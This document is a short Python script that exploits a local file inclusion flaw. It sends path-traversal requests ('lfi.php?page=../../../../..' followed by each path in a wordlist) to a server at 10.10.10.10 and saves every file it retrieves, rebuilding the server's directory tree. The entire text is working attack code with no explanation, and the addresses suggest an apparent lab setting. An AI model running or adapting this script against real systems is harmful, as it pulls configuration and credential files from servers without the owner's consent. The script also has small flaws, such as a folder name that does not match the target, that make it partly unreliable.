import requests
import os
import time

with open('lfi-files.txt', 'r') as fd:
    path_list = list(fd)

base_path = "172.16.1.10-"+str(time.time())
os.makedirs(base_path)

for path in path_list:
    path = path.strip('\n')
    r = requests.get('http://10.10.10.10/lfi.php?page=../../../../../../../..'+path)
    if len(r.content) > 0:
        if "/" in path:
            folder_path = path.rsplit("/",1)[0]
            file_name = path.rsplit("/",1)[1]
        elif "\\" in path:
            folder_path = path.rsplit("\\",1)[0]
            file_name = path.rsplit("\\",1)[1]
        
        if not os.path.exists(base_path+folder_path):
            os.makedirs(base_path+folder_path)
        
        with open(base_path+folder_path+"/"+file_name , 'w') as f:
            f.write(r.content.decode('utf-8'))

        print("\n[Succcess]["+path.strip('\n')+"]\n")
